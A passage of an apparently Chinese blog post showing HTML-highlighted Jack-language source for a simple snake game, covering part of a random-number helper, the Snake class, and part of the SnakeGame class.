-a;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> ((a + <span class="number">1</span>) &gt; b) &#123;</span><br><span class="line">			<span class="type">let</span> <span class="variable">a</span> <span class="operator">=</span> a - b;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> a;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Returns the next random number. Can be negative or positive.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	function <span class="type">int</span> <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="type">let</span> <span class="variable">x</span> <span class="operator">=</span> Random.mod(<span class="number">7919</span> + (<span class="number">17</span>*x),<span class="number">7919</span>);</span><br><span class="line">		<span class="keyword">return</span> x;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Returns a random value between x (inclusive) and y (non-inclusive).</span></span><br><span class="line"><span class="comment">	y must be greater than x.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	function <span class="type">int</span> <span class="title function_">between</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">		<span class="keyword">var</span> <span class="type">int</span> diff;</span><br><span class="line">		<span class="type">let</span> <span class="variable">diff</span> <span class="operator">=</span> y - x;</span><br><span class="line">		<span class="keyword">return</span> Random.mod(Random.next(), diff) + x;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>游戏的逻辑主体部分，不过写的过于复杂点了，其实还可以写的更简单一些，或者完成俄罗斯方块游戏之类的。<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* GluttonousSnake */</span></span><br><span class="line"><span class="comment">/* created by mike meng @ 2020.10.3</span></span><br><span class="line"><span class="comment">*  email: mml1106@126.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Snake</span> &#123;</span><br><span class="line">   field <span class="type">int</span> row;<span class="comment">//</span></span><br><span class="line">   field <span class="type">int</span> col;<span class="comment">//width</span></span><br><span class="line">   field <span class="type">int</span> bsize;<span class="comment">//square size</span></span><br><span class="line">   field Array head; <span class="comment">/*snake Queuehead*/</span></span><br><span class="line">   field Queue foods; <span class="comment">/*current foods*/</span></span><br><span class="line">   field <span class="type">int</span> foodCount; <span class="comment">// food number count</span></span><br><span class="line">   field Queue body; <span class="comment">// current snake body;</span></span><br><span class="line">   field <span class="type">int</span> speed; <span class="comment">//snake speed</span></span><br><span class="line">   field Array mask;<span class="comment">// direction mask</span></span><br><span class="line">   field <span class="type">int</span> direction; <span class="comment">/*-1: none, 0: up, 1: right, 2 : down, 3 : left*/</span></span><br><span class="line">   field <span class="type">int</span> state;  <span class="comment">//current state;</span></span><br><span class="line">   field <span class="type">int</span> score;  <span class="comment">//current score;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/** Constructs a new square with a given location and size. */</span></span><br><span class="line">   constructor Snake <span class="title function_">new</span><span class="params">(<span class="type">int</span> w,<span class="type">int</span> h)</span>&#123;</span><br><span class="line">      <span class="keyword">var</span> <span class="type">int</span> i;</span><br><span class="line">      <span class="keyword">var</span> <span class="type">int</span> val;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*matrix height &amp; width*/</span></span><br><span class="line">      <span class="type">let</span> <span class="variable">row</span> <span class="operator">=</span> h;</span><br><span class="line">      <span class="type">let</span> <span class="variable">col</span> <span class="operator">=</span> w;</span><br><span class="line">      <span class="type">let</span> <span class="variable">bsize</span> <span class="operator">=</span> <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*game state: 0: runing, 1: game over*/</span></span><br><span class="line">      <span class="type">let</span> <span class="variable">state</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*snake head*/</span></span><br><span class="line">      <span class="type">let</span> <span class="variable">head</span> <span class="operator">=</span> Array.new(<span class="number">2</span>);</span><br><span class="line">      let head[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">      let head[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">do</span> <span class="title function_">drawBlock</span><span class="params">(<span class="number">0</span>,<span class="number">0</span>)</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*snake foods*/</span></span><br><span class="line">      <span class="type">let</span> <span class="variable">foods</span> <span class="operator">=</span> Queue.new(<span class="number">100</span>);</span><br><span class="line">      <span class="type">let</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line">      <span class="keyword">do</span> Random.seed(<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">while</span>(~(i = <span class="number">0</span>))&#123;</span><br><span class="line">         <span class="type">let</span> <span class="variable">val</span> <span class="operator">=</span> Snake.mod(Random.next(),row*col);</span><br><span class="line">         <span class="keyword">do</span> foods.push_back(val);</span><br><span class="line">         <span class="comment">//do Snake.debug(val);</span></span><br><span class="line">         <span class="keyword">do</span> <span class="title function_">drawFood</span><span class="params">(val)</span>;</span><br><span class="line">         <span class="type">let</span> <span class="variable">i</span> <span class="operator">=</span> i - <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">/*snake body*/</span></span><br><span class="line">      <span class="type">let</span> <span class="variable">body</span> <span class="operator">=</span> Queue.new(row*col);</span><br><span class="line">      <span class="keyword">do</span> body.push_back(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*snake direction*/</span></span><br><span class="line">      <span class="comment">/*-1: none, 0: up, 1: right, 2 : down, 3 : left*/</span></span><br><span class="line">      <span class="type">let</span> <span class="variable">mask</span> <span class="operator">=</span> Array.new(<span class="number">5</span>);</span><br><span class="line">      <span class="type">let</span> <span class="variable">direction</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">      let mask[<span class="number">0</span>] = -<span class="number">1</span>;</span><br><span class="line">      let mask[<span class="number">1</span>] =  <span class="number">0</span>;</span><br><span class="line">      let mask[<span class="number">2</span>] =  <span class="number">1</span>;</span><br><span class="line">      let mask[<span class="number">3</span>] =  <span class="number">0</span>;</span><br><span class="line">      let mask[<span class="number">4</span>] = -<span class="number">1</span>; </span><br><span class="line"></span><br><span class="line">      <span class="comment">/*snake score*/</span></span><br><span class="line">      <span class="type">let</span> <span class="variable">score</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/** Disposes this square. */</span></span><br><span class="line">   method <span class="keyword">void</span> <span class="title function_">dispose</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">do</span> head.dispose();</span><br><span class="line">      <span class="keyword">do</span> foods.dispose();</span><br><span class="line">      <span class="keyword">do</span> body.dispose();</span><br><span class="line">      <span class="keyword">do</span> mask.dispose();</span><br><span class="line">      <span class="keyword">do</span> Memory.deAlloc(<span class="built_in">this</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*math  mod function*/</span></span><br><span class="line">   function <span class="type">int</span> <span class="title function_">mod</span><span class="params">(<span class="type">int</span> m,<span class="type">int</span> n)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> (m - ((m/n)*n));</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/** game is over**/</span></span><br><span class="line">   method <span class="type">boolean</span> <span class="title function_">isOver</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="type">return</span> <span class="variable">state</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/** snake move up **/</span></span><br><span class="line">   method <span class="keyword">void</span> <span class="title function_">moveUp</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">if</span>(direction = <span class="number">2</span>)&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">      <span class="type">let</span> <span class="variable">direction</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">/** snake move down **/</span></span><br><span class="line">   method <span class="keyword">void</span> <span class="title function_">moveDown</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">if</span>(direction = <span class="number">0</span>)&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">      <span class="type">let</span> <span class="variable">direction</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/** snake move left **/</span></span><br><span class="line">   method <span class="keyword">void</span> <span class="title function_">moveLeft</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">if</span>(direction = <span class="number">1</span>)&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">      <span class="type">let</span> <span class="variable">direction</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/** snake move right **/</span></span><br><span class="line">   method <span class="keyword">void</span> <span class="title function_">moveRight</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">if</span>(direction = <span class="number">3</span>)&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">      <span class="type">let</span> <span class="variable">direction</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*draw a block*/</span></span><br><span class="line">   method <span class="keyword">void</span> <span class="title function_">drawBlock</span><span class="params">(<span class="type">int</span> rx,<span class="type">int</span> cx)</span>&#123;</span><br><span class="line">      <span class="keyword">do</span> Screen.setColor(<span class="literal">true</span>);</span><br><span class="line">      <span class="keyword">do</span> Screen.drawRectangle(cx*<span class="number">16</span>,(rx+<span class="number">2</span>)*<span class="number">16</span>,cx*<span class="number">16</span> + <span class="number">15</span>,(rx+<span class="number">2</span>)*<span class="number">16</span> + <span class="number">15</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*erase a block*/</span></span><br><span class="line">   method <span class="keyword">void</span> <span class="title function_">eraseBlock</span><span class="params">(<span class="type">int</span> location)</span>&#123;</span><br><span class="line">      <span class="keyword">var</span> <span class="type">int</span> rx;</span><br><span class="line">      <span class="keyword">var</span> <span class="type">int</span> cx;</span><br><span class="line"></span><br><span class="line">      <span class="type">let</span> <span class="variable">rx</span> <span class="operator">=</span> location/col;</span><br><span class="line">      <span class="type">let</span> <span class="variable">cx</span> <span class="operator">=</span> Snake.mod(location,col);</span><br><span class="line">      <span class="keyword">do</span> Screen.setColor(<span class="literal">false</span>);</span><br><span class="line">      <span class="keyword">do</span> Screen.drawRectangle(cx*<span class="number">16</span>,(rx+<span class="number">2</span>)*<span class="number">16</span>,cx*<span class="number">16</span> + <span class="number">15</span>,(rx+<span class="number">2</span>)*<span class="number">16</span> + <span class="number">15</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*debug*/</span></span><br><span class="line">   function <span class="keyword">void</span> <span class="title function_">debug</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">      <span class="keyword">do</span> Screen.setColor(<span class="literal">true</span>);</span><br><span class="line">      <span class="keyword">do</span> Output.moveCursor(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">do</span> Output.printInt(x);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*draw a food*/</span></span><br><span class="line">   method <span class="keyword">void</span> <span class="title function_">drawFood</span><span class="params">(<span class="type">int</span> location)</span>&#123;</span><br><span class="line">      <span class="keyword">var</span> <span class="type">int</span> rx;</span><br><span class="line">      <span class="keyword">var</span> <span class="type">int</span> cx;</span><br><span class="line"></span><br><span class="line">      <span class="type">let</span> <span class="variable">rx</span> <span class="operator">=</span> location/col;</span><br><span class="line">      <span class="type">let</span> <span class="variable">cx</span> <span class="operator">=</span> Snake.mod(location,col);</span><br><span class="line">      <span class="keyword">do</span> Screen.setColor(<span class="literal">true</span>);</span><br><span class="line">      <span class="keyword">do</span> Screen.drawLine(cx*<span class="number">16</span>,(rx+<span class="number">2</span>)*<span class="number">16</span>,cx*<span class="number">16</span> + <span class="number">15</span>,(rx+<span class="number">2</span>)*<span class="number">16</span>);</span><br><span class="line">      <span class="keyword">do</span> Screen.drawLine(cx*<span class="number">16</span>,(rx+<span class="number">2</span>)*<span class="number">16</span>,cx*<span class="number">16</span>,(rx+<span class="number">2</span>)*<span class="number">16</span> + <span class="number">15</span>);</span><br><span class="line">      <span class="keyword">do</span> Screen.drawLine(cx*<span class="number">16</span>,(rx+<span class="number">2</span>)*<span class="number">16</span>,cx*<span class="number">16</span> + <span class="number">15</span>,(rx+<span class="number">2</span>)*<span class="number">16</span> + <span class="number">15</span>);</span><br><span class="line">      <span class="keyword">do</span> Screen.drawLine(cx*<span class="number">16</span>,(rx+<span class="number">2</span>)*<span class="number">16</span> + <span class="number">15</span>,cx*<span class="number">16</span> + <span class="number">15</span>,(rx+<span class="number">2</span>)*<span class="number">16</span> + <span class="number">15</span>);</span><br><span class="line">      <span class="keyword">do</span> Screen.drawLine(cx*<span class="number">16</span>+<span class="number">15</span>,(rx+<span class="number">2</span>)*<span class="number">16</span>,cx*<span class="number">16</span> + <span class="number">15</span>,(rx+<span class="number">2</span>)*<span class="number">16</span> + <span class="number">15</span>);</span><br><span class="line">      <span class="keyword">do</span> Screen.drawLine(cx*<span class="number">16</span>+<span class="number">15</span>,(rx+<span class="number">2</span>)*<span class="number">16</span>,cx*<span class="number">16</span>,(rx+<span class="number">2</span>)*<span class="number">16</span> + <span class="number">15</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*draw snake head*/</span></span><br><span class="line">   method <span class="keyword">void</span> <span class="title function_">drawHead</span><span class="params">(<span class="type">int</span> rx,<span class="type">int</span> cx)</span>&#123;</span><br><span class="line">      <span class="keyword">do</span> Screen.setColor(<span class="literal">true</span>);</span><br><span class="line">      <span class="keyword">do</span> Screen.drawLine(cx*<span class="number">16</span>,(rx+<span class="number">2</span>)*<span class="number">16</span>,cx*<span class="number">16</span> + <span class="number">15</span>,(rx+<span class="number">2</span>)*<span class="number">16</span> + <span class="number">15</span>);</span><br><span class="line">      <span class="keyword">do</span> Screen.drawLine(cx*<span class="number">16</span>+<span class="number">15</span>,(rx+<span class="number">2</span>)*<span class="number">16</span>,cx*<span class="number">16</span>,(rx+<span class="number">2</span>)*<span class="number">16</span> + <span class="number">15</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*snake move one step*/</span></span><br><span class="line">   method <span class="type">boolean</span> <span class="title function_">move</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> <span class="type">int</span> x;</span><br><span class="line">      <span class="keyword">var</span> <span class="type">int</span> y;</span><br><span class="line">      <span class="keyword">var</span> <span class="type">int</span> i;</span><br><span class="line">      <span class="keyword">var</span> <span class="type">int</span> val;</span><br><span class="line">      <span class="keyword">var</span> <span class="type">int</span> rx;</span><br><span class="line">      <span class="keyword">var</span> <span class="type">int</span> cx;</span><br><span class="line">      <span class="keyword">var</span> <span class="type">boolean</span> eat;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(isOver())&#123; <span class="keyword">return</span> <span class="literal">false</span>;&#125;</span><br><span class="line">      <span class="keyword">if</span>(direction &lt; <span class="number">0</span>)&#123; <span class="keyword">return</span> <span class="literal">true</span>;&#125;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">/*get the current move location*/</span></span><br><span class="line">      <span class="type">let</span> <span class="variable">x</span> <span class="operator">=</span> head[<span class="number">0</span>] + mask[direction];</span><br><span class="line">      <span class="type">let</span> <span class="variable">y</span> <span class="operator">=</span> head[<span class="number">1</span>] + mask[direction + <span class="number">1</span>];</span><br><span class="line">      <span class="type">let</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*check the snake will touch the edge*/</span></span><br><span class="line">      <span class="keyword">if</span>((x &lt; <span class="number">0</span>)|(y &lt; <span class="number">0</span>)|(x = row)|(y = col))&#123;</span><br><span class="line">         <span class="type">let</span> <span class="variable">state</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*check the snake will touch the body*/</span></span><br><span class="line">      <span class="type">let</span> <span class="variable">i</span> <span class="operator">=</span> body.size();</span><br><span class="line">      <span class="keyword">while</span>(~(i = <span class="number">0</span>))&#123;</span><br><span class="line">         <span class="type">let</span> <span class="variable">val</span> <span class="operator">=</span> body.pop_front();</span><br><span class="line">         <span class="type">let</span> <span class="variable">i</span> <span class="operator">=</span> i - <span class="number">1</span>;</span><br><span class="line">         <span class="type">let</span> <span class="variable">rx</span> <span class="operator">=</span> val/col;</span><br><span class="line">         <span class="type">let</span> <span class="variable">cx</span> <span class="operator">=</span> Snake.mod(val,col);</span><br><span class="line">         <span class="keyword">if</span>((rx = x) &amp; (cx = y))&#123;</span><br><span class="line">            <span class="type">let</span> <span class="variable">state</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">do</span> body.push_back(val);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(isOver())&#123; <span class="keyword">return</span> <span class="literal">false</span>;&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*check the snake touch the foods*/</span></span><br><span class="line">      <span class="type">let</span> <span class="variable">i</span> <span class="operator">=</span> foods.size();</span><br><span class="line">      <span class="keyword">while</span>(~(i = <span class="number">0</span>))&#123;</span><br><span class="line">         <span class="type">let</span> <span class="variable">i</span> <span class="operator">=</span> i - <span class="number">1</span>;</span><br><span class="line">         <span class="type">let</span> <span class="variable">val</span> <span class="operator">=</span> foods.pop_front();</span><br><span class="line">         <span class="type">let</span> <span class="variable">rx</span> <span class="operator">=</span> val/col;</span><br><span class="line">         <span class="type">let</span> <span class="variable">cx</span> <span class="operator">=</span> Snake.mod(val,col);</span><br><span class="line">         <span class="keyword">if</span>((rx = x) &amp; (cx = y))&#123;</span><br><span class="line">            <span class="type">let</span> <span class="variable">eat</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">let</span> <span class="variable">score</span> <span class="operator">=</span> score + <span class="number">1</span>;</span><br><span class="line">         &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">do</span> foods.push_back(val);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*move snake one step*/</span></span><br><span class="line">      let head[<span class="number">0</span>] = x;</span><br><span class="line">      let head[<span class="number">1</span>] = y;</span><br><span class="line">      <span class="keyword">do</span> <span class="title function_">drawBlock</span><span class="params">(x,y)</span>;</span><br><span class="line">      <span class="keyword">do</span> body.push_front(x*col + y);</span><br><span class="line">      <span class="keyword">if</span>(~eat)&#123;</span><br><span class="line">         <span class="keyword">do</span> <span class="title function_">eraseBlock</span><span class="params">(body.pop_back()</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         <span class="comment">/*we can produce a random food for the snake*/</span></span><br><span class="line">         <span class="comment">//do prodFood();</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   method <span class="type">int</span> <span class="title function_">prodFood</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="keyword">var</span> <span class="type">boolean</span> valid;</span><br><span class="line">      <span class="keyword">var</span> <span class="type">int</span> location;</span><br><span class="line">      <span class="keyword">var</span> <span class="type">int</span> val;</span><br><span class="line">      <span class="keyword">var</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">      <span class="type">let</span> <span class="variable">valid</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">while</span>(~valid)&#123;</span><br><span class="line">         <span class="type">let</span> <span class="variable">location</span> <span class="operator">=</span> Snake.mod(Random.next(),row*col);</span><br><span class="line">         <span class="type">let</span> <span class="variable">i</span> <span class="operator">=</span> body.size();</span><br><span class="line">         <span class="type">let</span> <span class="variable">valid</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">         <span class="keyword">while</span>(~(i=<span class="number">0</span>))&#123;</span><br><span class="line">            <span class="type">let</span> <span class="variable">val</span> <span class="operator">=</span> body.pop_front();</span><br><span class="line">            <span class="keyword">do</span> body.push_back(val);</span><br><span class="line">            <span class="keyword">if</span>(val = location)&#123;</span><br><span class="line">               <span class="type">let</span> <span class="variable">valid</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125; </span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">do</span> <span class="title function_">drawFood</span><span class="params">(location)</span>;</span><br><span class="line">      <span class="keyword">do</span> foods.push_back(location);</span><br><span class="line">      <span class="keyword">return</span> location;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*get the game score*/</span></span><br><span class="line">   method <span class="type">int</span> <span class="title function_">getScore</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> score;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* GluttonousSnake */</span></span><br><span class="line"><span class="comment">/* created by mike meng @ 2020.10.3</span></span><br><span class="line"><span class="comment">*  email: mml1106@126.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SnakeGame</span> &#123;</span><br><span class="line">   field Snake snake; <span class="comment">// the square of this game</span></span><br><span class="line">   field <span class="type">int</span> width; <span class="comment">// the current score of the snake game.</span></span><br><span class="line">   field <span class="type">int</span> height; <span class="comment">// the current score of the snake game.</span></span><br><span class="line">   field <span class="type">int</span> speed; <span class="comment">// the current move speed of the snake game.</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/** Constructs a new Square Game. */</span></span><br><span class="line">   constructor SnakeGame <span class="title function_">new</span><span class="params">(<span class="type">int</span> w,<span class="type">int</span> h)</span> &#123;</span><br><span class="line">      <span class="type">let</span> <span class="variable">snake</span> <span class="operator">=</span> Snake.new(w,h);</span><br><span class="line">      <span class="type">let</span> <span class="variable">speed</span> <span class="operator">=</span> <span class="number">1</span>;  <span class="comment">// initial state is no movement</span></span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/** Disposes this game. */</span></span><br><span class="line">   method <span class="keyword">void</span> <span class="title function_">dispose</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">do</span> snake.dispose();</span><br><span class="line">      <span class="keyword">do</span> Memory.deAlloc(<span class="built_in">this</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/**speed up game**/</span></span><br><span class="line">   method <span class="keyword">void</span> <span class="title function_">speedUp</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="type">let</span> <span class="variable">speed</span> <span class="operator">=</span> speed + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/**speed down game**/</span></span><br><span class="line">   method <span class="keyword">void</span> <span class="title function_">speedDown</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(speed = <span class="number">1</span>) &#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">      <span class="type">let</span> <span class="variable">speed</span> <span class="operator">=</span> speed - <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/** Moves the square in the current direction. */</span></span><br><span class="line">   method <span class="keyword">void</span> <span class="title function_">moveSnake</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">do</span> snake.move();</span><br><span class="line">      <span class="keyword">do</span> Sys.wait(<span class="number">5</span>);  <span class="comment">// delays the next movement</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   method <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">(<span class="type">int</span> seconds)</span>&#123;</span><br><span class="line">      <span class="keyword">do</span> Sys.wait(<span class="number">200</span>/speed);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   method <span class="keyword">void</span> <span class="title function_">drawBackgroud</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="keyword">do</span> Screen.setColor(<span class="literal">true</span>);</span><br><span class="line">      <span class="keyword">do</span> Screen.drawLine(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>);</span><br><span class="line">      <span class="keyword">do</span> Screen.drawLine(<span class="number">0</span>,<span class="number">0</span>,<span class="number">511</span>,<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">do</span> Screen.drawLine(<span class="number">511</span>,<span class="number">0</span>,<span class="number">511</span>,<span class="number">255</span>);</span><br><span class="line">      <span class="keyword">do</span> Screen.drawLine(<span class="number">0</span>,<span class="number">255</span>,<span class="number">511</span>,<span class="number">0255</span>);</span><br><span class="line">      <span class="keyword">do</span> Screen.drawLine(<span class="number">0</span>,<span class="number">30</span>,<span class="number">511</span>,<span class="number">30</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   method <span class="keyword">void</span> <span class="title function_">drawText</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="keyword">do</span> Screen.setColor(<span class="literal">true</span>);</span><br><span class="line">      <span class="keyword">do</span> Output.moveCursor(<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">      <span class="keyword">do</span> Output.printString(<span class="string">&quot;Your score is :&quot;</span>);</span><br><span class="line">      <span class="keyword">do</span> Output.printInt(snake.getScore());</span><br><span class="line">      <span class="keyword">if</span>(snake.isOver())&#123;</span><br><span class="line">         <span class="keyword">do</span> Output.moveCursor(<span class="number">1</span>,<span class="number">24</span>);</span><br><span class="line">         <span class="keyword">do</span> Output.printString(<span class="string">&quot;Game Over!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/** Runs the game: handles the user&#x27;s inputs and moves the square accordingly */</span></span><br><span class="line">   method <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> <span class="type">char</span> key;  <span class="comment">// the key currently pressed by the user</span></span><br><span class="line">      <span class="keyword">var</span> <span class="type">boolean</span> exit;</span><br><span class="line">      <span class="type">let</span> <span class="variable">exit</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (~exit) &#123;</span><br><span class="line">         <span class="comment">// waits for a key to be pressed</span></span><br><span class="line">         <span class="keyword">do</span> <span class="title function_">sleep</span><span class="params">(<span class="number">1</span>)</span>;</span><br><span class="line">         <span class="keyword">do</span> <span class="title function_">drawBackgroud</span><span class="params">()</span>;</span><br><span class="line">         <span class="keyword">do</span> <span class="title function_">moveSnake</span><span class="params">()</span>;</span><br><span class="line">         <span class="keyword">do</span> <span class="title function_">drawText</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">         <span class="type">let</span> <span class="variable">key</span> <span class="operator">=</span> Keyboard.keyPressed();</span><br><span class="line">         <span class="keyword">if</span> (key = <span class="number">81</span>)  &#123; <span class="type">let</span> <span class="variable">exit</span> <span class="operator">=</span> <span class="literal">true</span>; &#125;     <span class="comment">// q key</span></span><br><span class="line">         <span class="keyword">if</span> (key = <span class="number">43</span>)  &#123; <span class="keyword">do</span> <span class="title function_">speedUp</span><span class="params">()</span>;&#125;         <span class="comment">// speed up</span></span><br><span class="line">         <span class="keyword">if</span> (key = <span class="number">45</span>)  &#123; <span class="keyword">do</span> <span class="title function_">speedDown</span><span class="params">()</span>;&#125;       <span class="comment">// speed down</span></span><br><span class="line">         <span class="keyword">if</span> (key = <span class="number">131</span>) &#123; <span class="keyword">do</span> snake.moveUp();&#125;    <span class="comment">// up arrow</span></span><br><span class="line">         <span class="keyword">if</span> (key = <span class="number">133</span>) &#123; <span class="keyword">do</span> snake.moveDown(); &#125;  